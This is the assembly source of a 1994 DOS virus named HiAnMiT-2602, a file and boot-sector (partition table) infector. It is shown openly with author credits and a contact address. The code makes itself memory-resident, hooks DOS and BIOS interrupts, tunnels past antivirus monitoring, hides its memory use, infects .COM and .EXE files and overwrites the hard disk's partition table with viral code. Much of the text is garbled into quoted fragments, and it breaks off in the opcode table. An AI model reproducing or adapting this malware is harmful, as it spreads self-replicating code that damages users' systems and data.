




;                              Name: HiAnMiT-2602
;                              Author:  roy g biv

;                          UMB, Boot infector version



;                   Copyright (C) 1994 by Defjam Enterprises

;               Greetings to Prototype, and The Gingerbread Man


;                         Contact the Gingerbread Man:
;                        P.O. Box 457, Bexley, NSW 2207
;                                  AUSTRALIA






;                             COMMENTS AT COLUMN 81
;                                 DECLARATIONS

code_byte_c     equ offset code_end-offset begin                                ;true code size
code_word_c     equ (code_byte_c+1)/2                                           ;code size rounded up to next word
stack_byte_c    equ code_byte_c+80h                                             ;code size plus 128-byte stack
total_byte_c    equ offset quit_code-offset begin                               ;resident code size
code_kilo_c     equ (total_byte_c+3ffh)/400h                                    ;resident code size in kilobytes
code_sect_c     equ (code_byte_c+1ffh)/200h                                     ;true code size in sectors
com_byte_c      equ 0ffffh-stack_byte_c                                         ;largest infectable .COM file size
code_resp_c     equ code_kilo_c*40h                                             ;resident code size in paragraphs

useumb_flag     equ 1           ;this cannot be altered without size increase!  ;toggle value when used
int12h_flag     equ 2           ;this cannot be altered without size increase!  ;toggle value when hooked
val04h_flag     equ 4           ;unused
val08h_flag     equ 8           ;unused
val10h_flag     equ 10h         ;unused
closef_flag     equ 20h         ;this value was used only for convenience       ;close executable suffix (either .COM or .EXE)
suffix_flag     equ 40h         ;this cannot be altered!                        ;non-executable suffix (neither .COM nor .EXE)
int21h_flag     equ 80h         ;this cannot be altered without size increase!  ;toggle value when executing
; there you go - three free bits from a toggle switch to use at your discretion


;                                     CODE

.model  tiny
.186
.code

org     100h

begin:  call    file_load                                                       ;save initial offset on stack

file_load:
        pop     si                                                              ;calculate delta offset
        sub     si,offset file_load-offset begin                                ;point to absolute start of code
        mov     ax,1badh                                ;one                    ;call sign
        int     13h                                     ;bad                    ;check if resident
        cmp     ax,0deedh                               ;deed!                  ;return sign if resident
        jnz     go_resident                                                     ;branch if not resident

file_end:
        push    cs                                                              ;save code segment on stack
        pop     ds                                                              ;restore code segment from stack
        add     si,offset exe_buffer-offset begin                               ;point to original code
        cmp     word ptr ds:[si],5a4dh                                          ;check file type
        jz      exec_exe                                                        ;branch if .EXE file
        mov     di,100h                                                         ;.COM files always start at 100h
        push    es                                                              ;save PSP segment on stack
        push    di                                                              ;save return address on stack
                                                                                ;(simulate far call)
        movsb
        movsw                                                                   ;restore original 3 bytes of .COM file
        jmp     short fix_registers                                             ;branch to restore registers

exec_exe:
        add     si,0eh                                                          ;point to stack segment in header
        mov     di,es                                                           ;move PSP segment into DI
        add     di,10h                                                          ;point to first allocated segment
        lodsw                                                                   ;retrieve stack segment
        add     ax,di                                                           ;relocate for actual memory segment
        xchg    dx,ax                                                           ;move stack segment into DX
        lodsw                                                                   ;retrieve stack pointer
        xchg    cx,ax                                                           ;move stack pointer into CX
        lodsw                                                                   ;skip checksum (waste of 2 bytes!)
        lodsw                                                                   ;retrieve instruction pointer
        xchg    bx,ax                                                           ;move intruction pointer into BX
        lodsw                                                                   ;retrieve code segment
        add     ax,di                                                           ;relocate for actual memory segment
        mov     ss,dx                                                           ;restore original stack segment
        mov     sp,cx                                                           ;restore original stack pointer
        push    ax                                                              ;save original code segment on stack
        push    bx                                                              ;save original instruction pointer on stack
                                                                                ;(simulate far call)
fix_registers:
        push    es                                                              ;save PSP segment on stack
        pop     ds                                                              ;restore PSP segment from stack
        retf                                                                    ;return from far call
                                                                                ;(execute host file code)
        db      "HiAnMiT - Made in OZ"                                          ;patriotism at its best!

go_resident:
        push    ds                                                              ;save PSP segment on stack
        mov     ax,ds                                                           ;move PSP segment into AX
        dec     ax                                                              ;point to MCB segment
        mov     ds,ax                                                           ;move MCB segment into DS
        mov     di,0ffffh                                                       ;set destination offset to -1
        mov     bp,code_resp_c                                                  ;paragraph count while resident
        mov     ax,3306h                                                        ;subfunction to get true DOS version number
        int     21h                                                             ;get version number
        inc     al                                                              ;add 1 to al
        jz      normal_alloc                                                    ;branch if version < 5.00="" mov="" ax,5802h="" ;subfunction="" to="" get="" umb="" link="" state="" int="" 21h="" ;get="" link="" state="" cbw="" ;zero="" ah="" xchg="" bx,ax="" ;store="" umb="" link="" state="" in="" bx="" (zero="" bh)="" push="" bx="" ;save="" umb="" link="" state="" on="" stack="" mov="" ax,5800h="" ;subfunction="" to="" get="" memory="" allocation="" strategy="" int="" 21h="" ;get="" allocation="" strategy="" push="" ax="" ;save="" allocation="" strategy="" on="" stack="" mov="" ax,5803h="" ;subfunction="" to="" set="" umb="" link="" state="" mov="" bl,1="" ;add="" umbs="" to="" dos="" memory="" chain="" int="" 21h="" ;set="" umb="" link="" state="" jb="" fix_link="" ;branch="" if="" error="" dec="" ax="" dec="" ax="" ;subfunction="" to="" set="" memory="" allocation="" strategy="" push="" ax="" ;save="" subfunction="" on="" stack="" mov="" bl,40h="" ;high="" memory="" first="" fit="" int="" 21h="" ;set="" memory="" allocation="" strategy="" jb="" fix_strategy="" ;branch="" if="" error="" mov="" bx,di="" ;number="" of="" paragraphs="" to="" allocate="" alloc_mem:="" mov="" ah,48h="" ;subfunction="" to="" allocate="" memory="" int="" 21h="" ;allocate="" memory="" jb="" alloc_mem="" ;branch="" if="" error="" push="" ax="" ;save="" allocated="" segment="" on="" stack="" dec="" ax="" ;point="" to="" mcb="" segment="" mov="" ds,ax="" ;mov="" mcb="" segment="" into="" ds="" mov="" bl,4dh="" ;valid-mcb="" designator="" (not="" end="" of="" chain)="" xchg="" bl,byte="" ptr="" ds:[di+1]="" ;exchange="" old="" mcb="" type="" with="" new="" mcb="" type="" mov="" di,3="" ;offset="" of="" top="" of="" memory="" segment="" inc="" bp="" ;allow="" for="" the="" mcb="" segment="" sub="" word="" ptr="" ds:[di],bp="" ;allocate="" memory="" add="" ax,word="" ptr="" ds:[di]="" ;add="" new="" size="" of="" mcb="" inc="" ax="" ;point="" to="" next="" mcb="" segment="" mov="" es,ax="" ;move="" mcb="" segment="" into="" es="" inc="" ax="" ;point="" to="" new="" code="" segment="" xchg="" bp,ax="" ;exchange="" memory="" segment="" with="" paragraph="" count="" dec="" ax="" ;convert="" to="" true="" paragraph="" count="" std="" ;set="" index="" direction="" to="" backwards="" stosw="" ;store="" size="" of="" memory="" block="" mov="" byte="" ptr="" es:[di+1],ah="" ;clear="" top="" half="" of="" memory="" block="" owner="" mov="" al,8="" ;dos-owned="" memory="" block="" designator="" stosb="" ;store="" type="" of="" memory="" block="" mov="" di,4353h="" ;system-code="" designator="" xchg="" di,ax="" ;set="" destination="" offset="" to="" 8="" stosw="" ;store="" name="" of="" memory="" block="" xor="" di,di="" ;zero="" di="" mov="" al,bl="" ;move="" mcb="" type="" into="" al="" stosb="" ;store="" mcb="" type="" pop="" es="" ;restore="" allocated="" segment="" from="" stack="" mov="" ah,49h="" ;subfunction="" to="" free="" memory="" int="" 21h="" ;free="" memory="" mov="" es,bp="" ;move="" new="" code="" segment="" into="" es="" fix_strategy:="" pop="" ax="" ;restore="" subfunction="" from="" stack="" pop="" bx="" ;restore="" memory="" allocation="" strategy="" from="" stack="" pushf="" ;save="" flags="" on="" stack="" int="" 21h="" ;set="" memory="" allocation="" strategy="" popf="" ;restore="" flags="" from="" stack="" fix_link:="" mov="" ax,5803h="" ;subfunction="" to="" set="" umb="" link="" state="" pop="" bx="" ;restore="" umb="" link="" state="" from="" stack="" pushf="" ;save="" flags="" on="" stack="" int="" 21h="" ;set="" umb="" link="" state="" popf="" ;restore="" flags="" from="" stack="" jnb="" move_code="" ;branch="" if="" no="" error="" normal_alloc:="" sub="" word="" ptr="" ds:[di+4],bp="" ;reduce="" free="" memory="" sub="" word="" ptr="" ds:[di+13h],bp="" ;reduce="" system="" memory="" mov="" es,word="" ptr="" ds:[di+13h]="" ;move="" new="" top="" of="" system="" memory="" into="" es="" move_code:="" push="" cs="" ;save="" initial="" code="" segment="" on="" stack="" push="" si="" ;save="" inital="" offset="" on="" stack="" mov="" cx,code_word_c="" ;number="" of="" words="" to="" move="" inc="" di="" ;set="" destination="" offset="" to="" 0="" cld="" ;set="" index="" direction="" to="" forward="" db="" 2eh="" ;cs:="" ;(to="" avoid="" having="" to="" alter="" ds)="" repz="" movsw="" ;move="" code="" to="" top="" of="" system="" memory="" push="" es="" ;save="" destination="" code="" segment="" on="" stack="" push="" offset="" fhook_interrupts-offset="" begin="" ;save="" destination="" offset="" on="" stack="" ;(simulate="" far="" call)="" ;(say="" that="" slowly,="" so="" as="" to="" not="" offend)="" retf="" ;return="" from="" far="" call="" ;(continue="" execution="" at="" top="" of="" free="" memory)="" fhook_interrupts:="" mov="" ah,52h="" ;subfunction="" to="" get="" dos="" list="" of="" lists="" int="" 21h="" ;retrieve="" segment="" of="" lol="" ;(equivalent="" to="" code="" segment="" of="" msdos.sys="" (or="" equivalent))="" push="" cs="" ;save="" code="" segment="" on="" stack="" pop="" ds="" ;restore="" code="" segment="" from="" stack="" mov="" word="" ptr="" ds:[offset="" system_seg-offset="" begin-2],es="" ;save="" system="" file="" code="" segment="" mov="" word="" ptr="" ds:[di+offset="" process_no-offset="" header_buffer],cx="" ;specify="" host="" is="" the="" only="" program="" currently="" executing="" org="" $-1="" ;hard-coded="" fixup="" for="" previous="" operation="" push="" cx="" ;save="" 0="" on="" stack="" inc="" cx="" ;set="" toggle="" switches...="" cmp="" bp,0a000h="" ;check="" top="" of="" free="" memory="" segment="" adc="" cx,cx="" ;set="" toggle="" to="" allow="" for="" umb="" use="" mov="" word="" ptr="" ds:[di+offset="" toggle_byte-offset="" header_buffer],cx="" ;interrupt="" 12h="" already="" hooked,="" ;interrupt="" 21h="" not="" executing="" ;(incidently="" zeroes="" handle="" number)="" org="" $-1="" ;hard-coded="" fixup="" for="" previous="" operation="" ;="" after="" dos="" has="" loaded,="" ;="" reducing="" the="" value="" returned="" by="" interrupt="" 12h="" ;="" will="" not="" reduce="" the="" available="" free="" memory!="" ;="" therefore,="" code="" stored="" here="" will="" be="" overwritten="" when="" command.com="" reloads="" pop="" ds="" ;set="" ds="" to="" 0="" push="" cs="" ;save="" code="" segment="" on="" stack="" pop="" es="" ;restore="" code="" segment="" from="" stack="" mov="" si,4="" ;offset="" of="" interrupt="" 1="" in="" interrupt="" table="" movsw="" ;save="" original="" offset="" movsw="" ;save="" original="" code="" segment="" mov="" bp,offset="" new_1-offset="" begin="" ;offset="" of="" new="" interrupt="" 1="" handler="" mov="" word="" ptr="" ds:[si-4],bp="" ;store="" new="" offset="" mov="" word="" ptr="" ds:[si-2],cs="" ;store="" new="" code="" segment="" lodsw="" ;add="" 2="" to="" si="" lodsw="" ;add="" 2="" to="" si="" push="" si="" ;save="" offset="" of="" interrupt="" 3="" on="" stack="" movsw="" ;save="" original="" offset="" movsw="" ;save="" original="" code="" segment="" les="" bx,dword="" ptr="" ds:[si+74h]="" ;retrieve="" address="" of="" interrupt="" 21h="" handler="" mov="" ah,19h="" ;the="" operation="" must="" have="" bit="" 1="" set="" ;retrieve="" current="" default="" drive="" ;(dummy="" call="" to="" invoke="" interrupt="" 21h)="" pushf="" ;save="" flags="" on="" stack="" push="" cs="" ;save="" code="" segment="" on="" stack="" push="" offset="" hook21h_cont-offset="" begin="" ;save="" offset="" on="" stack="" ;(simulate="" interrupt="" call)="" call_int1:="" push="" ax="" ;save="" flags="" (but="" with="" t="" flag="" set)="" on="" stack="" push="" es="" ;save="" interrupt="" handler="" code="" segment="" on="" stack="" push="" bx="" ;save="" interrupt="" handler="" offset="" on="" stack="" ;(simulate="" interrupt="" call)="" new_1:="" push="" es="" ;save="" es="" on="" stack="" push="" 0="" ;save="" 0="" on="" stack="" pop="" es="" ;set="" es="" to="" 0="" pusha="" ;save="" all="" registers="" on="" stack="" mov="" bp,sp="" ;point="" to="" current="" top="" of="" stack="" std="" ;set="" index="" direction="" to="" forward="" lea="" si,word="" ptr="" [bp+14h]="" ;offset="" of="" address="" of="" original="" interrupt="" address="" mov="" di,0eh="" ;offset="" of="" interrupt="" 3="" segment="" in="" interrupt="" table="" db="" 36h="" ;ss:="" ;(to="" avoid="" having="" to="" save="" and="" set="" ds)="" lodsw="" ;retrieve="" new="" code="" segment="" stosw="" ;store="" new="" code="" segment="" db="" 36h="" ;ss:="" ;(to="" avoid="" having="" to="" save="" and="" set="" ds)="" movsw="" ;store="" new="" offset="" cmp="" ax,4d47h="" ;check="" interrupt="" code="" segment="" ;(the="" value="" here="" is="" altered="" as="" required)="" system_seg:="" ja="" quit_1="" ;branch="" while="" not="" correct="" segment="" mov="" si,offset="" header_buffer-offset="" begin+2="" ;offset="" of="" address="" of="" original="" interrupt="" 1="" address="" scasw="" ;add="" 2="" to="" di="" scasw="" ;add="" 2="" to="" di="" db="" 2eh="" ;cs:="" ;(to="" avoid="" having="" to="" save="" and="" set="" ds)="" movsw="" ;restore="" original="" offset="" of="" interrupt="" 1="" handler="" db="" 2eh="" ;cs:="" ;(to="" avoid="" having="" to="" save="" and="" set="" ds)="" movsw="" ;restore="" original="" code="" segment="" of="" interrupt="" 1="" handler="" ;(remap="" interrupt="" 3)="" quit_1:="" popa="" ;restore="" all="" registers="" from="" stack="" pop="" es="" ;restore="" es="" from="" stack="" iret="" ;return="" from="" interrupt="" hook21h_cont:="" pop="" si="" ;restore="" offset="" of="" interrupt="" 3="" from="" stack="" push="" si="" ;save="" offset="" of="" interrupt="" 3="" on="" stack="" push="" offset="" hook1_cont-offset="" begin="" ;save="" offset="" on="" stack="" ;(simulate="" subroutine="" call)="" hook_int:="" push="" cs="" ;save="" code="" segment="" on="" stack="" pop="" es="" ;restore="" code="" segment="" from="" stack="" mov="" di,offset="" jfar_21h-offset="" begin+1="" ;area="" to="" store="" original="" interrupt="" 21h="" address="" movsw="" ;save="" original="" code="" segment="" lodsw="" ;retrieve="" original="" code="" segment="" stosw="" ;save="" original="" code="" segment="" cmp="" ax,word="" ptr="" cs:[bp+offset="" system_seg-offset="" new_1-2]="" ;check="" segment="" of="" system="" file="" ja="" hook_cont="" ;branch="" if="" system="" segment="" not="" located="" mov="" al,0eah="" ;set="" opcode="" to="" jmp="" xxxx:xxxx="" mov="" di,offset="" old21h_code-offset="" begin="" ;area="" to="" store="" original="" 5="" bytes="" of="" handler="" stosb="" ;store="" jump="" mov="" ax,offset="" intro_21h-offset="" begin="" ;offset="" of="" new="" interrupt="" handler="" stosw="" ;store="" offset="" mov="" ax,cs="" ;code="" segment="" of="" new="" interrupt="" handler="" stosw="" ;store="" code="" segment="" push="" offset="" hook_cont-offset="" begin="" ;save="" offset="" on="" stack="" ;(simulate="" subroutine="" call)="" hook_interrupt:="" push="" ds="" ;save="" ds="" on="" stack="" push="" es="" ;save="" es="" on="" stack="" pusha="" ;save="" all="" registers="" on="" stack="" push="" cs="" ;save="" code="" segment="" on="" stack="" pop="" ds="" ;restore="" code="" segment="" of="" storage="" area="" from="" stack="" mov="" cx,offset="" toggle_byte-offset="" old21h_code="" ;number="" of="" bytes="" to="" save="" mov="" si,offset="" old21h_code-offset="" begin="" ;area="" to="" store="" original="" 5="" bytes="" of="" handler="" les="" di,dword="" ptr="" ds:[offset="" jfar_21h-offset="" begin+1]="" ;retrieve="" original="" handler="" address="" cld="" ;set="" index="" direction="" to="" forward="" cli="" ;disable="" interrupts="" set_intadr:="" lodsb="" ;retrieve="" original="" byte="" xchg="" al,byte="" ptr="" es:[di]="" ;exchange="" it="" with="" new="" byte="" mov="" byte="" ptr="" ds:[si-1],al="" ;store="" original="" byte="" inc="" di="" ;skip="" 1="" byte="" in="" destination="" loop="" set_intadr="" ;branch="" while="" bytes="" remain="" ;(stealth-hook="" interrupt)="" sti="" ;enable="" interrupts="" popa="" ;restore="" all="" registers="" from="" stack="" pop="" es="" ;restore="" es="" from="" stack="" pop="" ds="" ;restore="" ds="" from="" stack="" ret="" ;return="" from="" subroutine="" hook_cont:="" mov="" si,0bch="" ;offset="" of="" interrupt="" 2fh="" in="" interrupt="" table="" mov="" di,offset="" jfar_2fh-offset="" begin+1="" ;area="" to="" store="" original="" interrupt="" 2fh="" handler="" movsw="" ;save="" original="" offset="" movsw="" ;save="" original="" code="" segment="" mov="" word="" ptr="" ds:[si-4],offset="" new_2fh-offset="" begin="" ;store="" new="" offset="" mov="" word="" ptr="" ds:[si-2],cs="" ;store="" new="" code="" segment="" known_ret:="" ret="" ;return="" from="" subroutine="" hook1_cont:="" pop="" si="" ;restore="" offset="" of="" interrupt="" 3="" from="" stack="" mov="" word="" ptr="" ds:[si-8],bp="" ;save="" new="" offset="" mov="" word="" ptr="" ds:[si-6],cs="" ;save="" new="" code="" segment="" ;(rehook="" interrupt="" 1="" -="" it's="" already="" been="" saved)="" push="" ds="" ;save="" ds="" on="" stack="" mov="" ax,0f000h="" ;segment="" of="" bios="" mov="" di,offset="" system_seg-offset="" begin-2="" ;area="" to="" store="" bios="" segment="" stosw="" ;store="" bios="" segment="" mov="" al,75h="" ;set="" opcode="" to="" jnz="" stosb="" ;store="" opcode="" push="" cs="" ;save="" code="" segment="" on="" stack="" pop="" ds="" ;restore="" code="" segment="" from="" stack="" mov="" ah,13h="" ;subfunction="" to="" set="" disk="" interrupt="" handler="" mov="" bx,offset="" new_13h-offset="" begin="" ;offset="" of="" new="" interrupt="" 13h="" handler="" mov="" byte="" ptr="" ds:[bx+offset="" int13h_branch-offset="" new_13h-1],offset="" jfar_13h-offset="" int13h_branch="" ;disable="" interrupt="" 13h="" handler="" initially...="" org="" $-1="" ;hard-coded="" fixup="" for="" previous="" operation="" mov="" dx,bx="" ;offset="" of="" new="" interrupt="" 13h="" handler="" int="" 2fh="" ;set="" disk="" interrupt="" handler="" ;the="" return="" value="" should="" be="" pointing="" to="" ;the="" rom="" bios,="" but="" i'll="" trace="" it="" anyway="" push="" cs="" ;save="" code="" segment="" on="" stack="" pop="" ds="" ;restore="" code="" segment="" from="" stack="" mov="" di,offset="" jfar_13h-offset="" begin+1="" ;area="" to="" store="" original="" interrupt="" 13h="" address="" mov="" word="" ptr="" ds:[di],bx="" ;save="" original="" offset="" mov="" word="" ptr="" ds:[di+2],es="" ;save="" original="" code="" segment="" mov="" ah,1="" ;the="" operation="" must="" have="" bit="" 1="" set="" ;retrieve="" system="" status="" ;(dummy="" call="" to="" invoke="" interrupt="" 13h)="" pushf="" ;save="" flags="" on="" stack="" push="" cs="" ;save="" code="" segment="" on="" stack="" call="" call_int1="" ;save="" offset="" on="" stack="" ;(simulate="" interrupt="" call)="" mov="" byte="" ptr="" ds:[offset="" system_seg-offset="" begin],77h="" ;change="" operation="" from="" jnz="" to="" ja="" pop="" ds="" ;restore="" ds="" from="" stack="" push="" ds="" ;save="" ds="" on="" stack="" popf="" ;clear="" t="" flag="" ;="" since="" interrupt="" 13h="" returns="" with="" a="" retf="" 2,="" and="" not="" an="" iret,="" ;="" the="" trace="" flag="" must="" be="" cleared="" manually,="" ;="" otherwise="" severe="" performance="" degradation="" will="" occur="" pop="" bx="" ;restore="" initial="" offset="" from="" stack="" pop="" ax="" ;restore="" initial="" code="" segment="" from="" stack="" push="" cs="" ;save="" code="" segment="" on="" stack="" pop="" es="" ;restore="" code="" segment="" from="" stack="" cmp="" word="" ptr="" ds:[si+2],0f000h="" ;check="" bios="" code="" segment="" jnz="" no_write="" ;branch="" if="" not="" in="" rom="" movsw="" ;save="" original="" offset="" movsw="" ;save="" original="" code="" segment="" mov="" ds,ax="" ;store="" initial="" code="" segment="" in="" ds="" push="" ds="" ;save="" initial="" code="" segment="" on="" stack="" pop="" es="" ;restore="" initial="" code="" segment="" from="" stack="" mov="" ax,201h="" ;read="" 1="" sector="" mov="" cl,al="" ;cylinder="" 0,="" sector="" 1="" mov="" dx,80h="" ;side="" 0="" of="" hard="" disk="" int="" 3="" ;read="" partition="" table="" ;(interrupt="" 13h="" remapped="" to="" interrupt="" 3)="" jb="" no_write="" ;branch="" if="" error="" mov="" cl,4="" ;only="" 4="" possible="" partitions="" mov="" byte="" ptr="" cs:[di+offset="" int13h_branch-offset="" jmp_skip-1],cl="" ;enable="" interrupt="" 13h="" handler="" org="" $-1="" ;hard-coded="" fixup="" for="" previous="" operation="" ;="" if="" bios="" code="" segment="" is="" not="" located="" in="" rom,="" then="" something="" else="" is="" loaded="" ;="" (antivirus="" card,="" software="" with="" anti-tunneling="" techniques,="" etc.)="" ;="" so="" partition="" write="" must="" not="" occur="" mov="" di,1beh="" ;offset="" of="" first="" partition="" in="" partition="" table="" find_hdd:="" cmp="" dl,byte="" ptr="" ds:[bx+di]="" ;check="" partition="" type="" jnz="" no_part="" ;branch="" if="" not="" active="" partition="" push="" cs="" ;save="" code="" segment="" on="" stack="" pop="" es="" ;restore="" code="" segment="" from="" stack="" lea="" si,word="" ptr="" [bx+di]="" ;offset="" of="" active="" partition="" information="" xchg="" di,ax="" ;move="" inter-buffer="" offset="" into="" ax="" mov="" di,offset="" p_offset-offset="" begin="" ;area="" to="" store="" active="" partition="" offset="" stosw="" ;store="" partition="" information="" offset="" mov="" cl,move_isize="" ;directive="" at="" end="" of="" code="" to="" calculate="" this="" ;partition="" information="" byte-count="" org="" $-2="" ;hard-coded="" fixup="" for="" previous="" operation="" push="" cx="" ;save="" active="" partition="" byte-count="" on="" stack="" push="" si="" ;save="" active="" partition="" offset="" on="" stack="" repz="" ;repeat="" until="" cx="0..." db="" move_ptype="" ;directive="" at="" end="" of="" code="" to="" calculate="" this="" ;store="" active="" partition="" information="" mov="" cl,move_psize="" ;directive="" at="" end="" of="" code="" to="" calculate="" this="" ;new="" partition="" loader="" byte-count="" org="" $-2="" ;hard-coded="" fixup="" for="" previous="" operation="" mov="" si,bx="" ;offset="" of="" partition="" table="" push="" cx="" ;save="" partition="" loader="" byte-count="" on="" stack="" push="" si="" ;save="" offset="" of="" partition="" table="" on="" stack="" repz="" ;repeat="" until="" cx="0..." db="" move_ptype="" ;directive="" at="" end="" of="" code="" to="" calculate="" this="" ;save="" original="" partition="" table="" loader="" push="" ds="" ;save="" partition="" segment="" on="" stack="" pop="" es="" ;restore="" partition="" segment="" from="" stack="" push="" cs="" ;save="" code="" segment="" on="" stack="" pop="" ds="" ;restore="" code="" segment="" from="" stack="" mov="" ax,2="" ;number="" of="" information="" sets="" to="" alter="" mov="" word="" ptr="" ds:[di+offset="" track-offset="" newp_loader+1],ax="" ;save="" track="" of="" available="" sectors="" org="" $-1="" ;hard-coded="" fixup="" for="" previous="" operation="" mov="" word="" ptr="" ds:[di+offset="" side-offset="" newp_loader+1],dx="" ;save="" side="" of="" available="" sectors="" org="" $-1="" ;hard-coded="" fixup="" for="" previous="" operation="" mov="" si,di="" ;move="" new="" active="" partition="" offset="" into="" si="" load_new:="" pop="" di="" ;restore="" partition="" offset="" from="" stack="" pop="" cx="" ;restore="" partition="" byte-count="" from="" stack="" repz="" ;repeat="" until="" cx="0..." db="" move_ptype="" ;directive="" at="" end="" of="" code="" to="" calculate="" this="" ;store="" new="" partition="" information="" dec="" ax="" ;decrement="" loop="" count="" jnz="" load_new="" ;branch="" while="" information="" sets="" remain="" mov="" ax,301h="" ;write="" 1="" sector="" inc="" cx="" ;cylinder="" 0,="" sector="" 1="" int="" 3="" ;write="" infected="" partition="" table="" push="" cs="" ;save="" code="" segment="" on="" stack="" pop="" es="" ;restore="" code="" segment="" from="" stack="" mov="" ax,code_sect_c+300h="" ;number="" of="" sectors="" in="" code="" xor="" bx,bx="" ;set="" write="" address="" to="" 0="" inc="" cx="" ;cylinder="" 0,="" sector="" 2="" int="" 3="" ;write="" viral="" code="" dec="" cx="" ;dummy="" cx="" ;(so="" loop="" will="" fall="" straight="" through)="" no_part:add="" di,10h="" ;point="" to="" next="" partition="" loop="" find_hdd="" ;repeat="" while="" possible="" partitions="" remain="" no_write:="" push="" 0="" ;save="" 0="" on="" stack="" pop="" es="" ;set="" es="" to="" 0="" mov="" si,offset="" header_buffer-offset="" begin+4="" ;offset="" of="" address="" of="" original="" interrupt="" 3="" address="" mov="" di,0ch="" ;offset="" of="" interrupt="" 3="" in="" interrupt="" table="" db="" 2eh="" ;cs:="" ;(to="" avoid="" having="" to="" set="" ds)="" movsw="" ;restore="" original="" offset="" db="" 2eh="" ;cs:="" ;(to="" avoid="" having="" to="" set="" ds)="" movsw="" ;restore="" original="" code="" segment="" pop="" es="" ;restore="" psp="" segment="" from="" stack="" lds="" si,dword="" ptr="" es:[di-6]="" ;retrieve="" original="" termination="" address="" pushf="" ;save="" flags="" on="" stack="" push="" cs="" ;save="" code="" segment="" on="" stack="" call="" set_terminate="" ;save="" offset="" on="" stack="" ;(simulate="" interrupt="" call)="" push="" offset="" file_end-offset="" begin="" ;save="" offset="" on="" stack="" ;(simluate="" subroutine="" call)="" test_int12h:="" push="" offset="" save_psp-offset="" begin="" ;save="" return="" address="" on="" stack="" xor="" si,si="" ;zero="" si="" mov="" di,offset="" toggle_byte-offset="" begin="" ;area="" to="" store="" toggle="" data="" test="" byte="" ptr="" cs:[di],int12h_flag="" ;check="" interrupt="" 12h="" status="" jnz="" get_psp="" ;branch="" if="" interrupt="" 12h="" already="" hooked="" mov="" ds,si="" ;set="" ds="" to="" 0="" mov="" word="" ptr="" ds:[si+48h],offset="" new_12h-offset="" begin="" ;store="" new="" offset="" mov="" word="" ptr="" ds:[si+4ah],cs="" ;store="" new="" code="" segment="" ;(hook="" interrupt="" 12h="" to="" hide="" memory="" change)="" ;="" if="" interrupt="" 12h="" is="" hooked="" from="" the="" partition="" table,="" ;="" ms-dos="" v6.xx="" emm386.exe="" causes="" a="" system="" hang="" or="" byte="" ptr="" cs:[di],int12h_flag="" ;specify="" that="" interrupt="" 12h="" has="" been="" hooked="" get_psp:mov="" ah,51h="" ;subfunction="" to="" retrieve="" psp="" segment="" jmp="" call_21h="" ;retrieve="" psp="" segment="" save_psp:="" mov="" ds,bx="" ;move="" psp="" segment="" into="" ds="" test="" byte="" ptr="" cs:[di],useumb_flag="" ;check="" where="" code="" is="" loaded="" jz="" int12h_ret="" ;branch="" if="" code="" loaded="" high="" add="" word="" ptr="" ds:[si+2],code_resp_c="" ;restore="" top="" of="" free="" memory="" int12h_ret:="" push="" ds="" ;save="" psp="" segment="" on="" stack="" pop="" es="" ;restore="" psp="" segment="" from="" stack="" ret="" ;return="" from="" subroutine="" terminate:="" push="" cs="" ;save="" code="" segment="" on="" stack="" pop="" ds="" ;restore="" code="" segment="" from="" stack="" pushf="" ;save="" flags="" on="" stack="" mov="" bx,offset="" process_no-offset="" begin="" ;area="" containing="" process="" information="" sub="" word="" ptr="" ds:[bx],4="" ;specify="" current="" process="" is="" terminating="" mov="" si,word="" ptr="" ds:[bx]="" ;retrieve="" process="" number="" test="" byte="" ptr="" ds:[bx+offset="" toggle_byte-offset="" process_no],int21h_flag="" ;check="" interrupt="" 21h="" status="" org="" $-1="" ;hard-coded="" fixup="" for="" previous="" operation="" push="" word="" ptr="" ds:[bx+si+offset="" process_seg-offset="" process_no]="" ;save="" original="" code="" segment="" on="" stack="" org="" $-1="" ;hard-coded="" fixup="" for="" previous="" operation="" push="" word="" ptr="" ds:[bx+si+offset="" process_off-offset="" process_no]="" ;save="" original="" offset="" on="" stack="" org="" $-1="" ;hard-coded="" fixup="" for="" previous="" operation="" jz="" end_int21h="" ;branch="" if="" interrupt="" 21h="" is="" not="" executing="" ;(for="" compability="" with="" interrupt="" 20h,="" et="" al)="" intro_21h:="" pushf="" ;save="" flags="" on="" stack="" call="" hook_interrupt="" ;hook="" interrupt="" xor="" byte="" ptr="" cs:[offset="" toggle_byte-offset="" begin],int21h_flag="" ;toggle="" interrupt="" 21h="" status="" js="" exec_int21h="" ;branch="" if="" interrupt="" 21h="" is="" executing="" cmp="" ax,4b00h="" ;check="" requested="" operation="" jz="" exec_child="" ;branch="" if="" execute="" popf="" ;restore="" flags="" from="" stack="" end_int21h:="" retf="" 2="" ;return="" from="" interrupt="" with="" flags="" set="" exec_child:="" mov="" bx,offset="" header_buffer-offset="" begin+0ah="" ;area="" to="" contain="" parameter="" block="" mov="" ss,word="" ptr="" cs:[bx+10h]="" ;restore="" original="" stack="" segment="" mov="" sp,word="" ptr="" cs:[bx+0eh]="" ;restore="" original="" stack="" pointer="" ;(what="" we="" need="" is="" an="" lss,sp="" command="" in="" 8086="" mode)="" cbw="" ;zero="" ax="" jmp="" dword="" ptr="" cs:[bx+12h]="" ;branch="" to="" host="" code="" exec_int21h:="" push="" cs="" ;save="" code="" segment="" on="" stack="" push="" offset="" intro_21h-offset="" begin="" ;save="" offset="" on="" stack="" ;(simulate="" interrupt="" call)="" push="" si="" ;save="" si="" on="" stack="" pusha="" ;save="" all="" registers="" on="" stack="" mov="" cx,(offset="" call_21h-offset="" op_table)/3="" ;opcode="" table="" length="" mov="" si,offset="" op_table-offset="" begin-2="" ;offset="" of="" table="" of="" opcodes="" find_op:inc="" si="" ;skip="" low="" byte="" of="" opcode="" address="" inc="" si="" ;skip="" high="" byte="" of="" opcode="" address="" ;="" using="" cmpsw="" here,="" to="" save="" a="" byte,="" will="" result="" in="" a="" system="" hang,="" if="" di="FFFFh" db="" 2eh="" ;cs:="" ;(to="" avoid="" having="" to="" save="" and="" set="" ds)="" lodsb="" ;retrieve="" opcode="" from="" table="" cmp="" al,ah="" ;check="" opcode="" loopnz="" find_op="" ;branch="" if="" not="" handled="" but="" opcodes="" remain="" push="" word="" ptr="" cs:[si]="" ;save="" handler="" address="" on="" stack="" mov="" bp,sp="" ;point="" to="" current="" top="" of="" stack="" pop="" word="" ptr="" ss:[bp+12h]="" ;restore="" handler="" address="" from="" stack="" ;(saves="" handler="" address="" at="" top="" of="" stack)="" ;(simulate="" subroutine="" call)="" popa="" ;restore="" all="" registers="" from="" stack="" ret="" ;return="" from="" subroutine="" db="" "you="" can't="" catch="" the="" gingerbread="" man!!"="" ;yeah!="" op_table:="" db="" 11h="" ;find="" first="" (fcb)="" 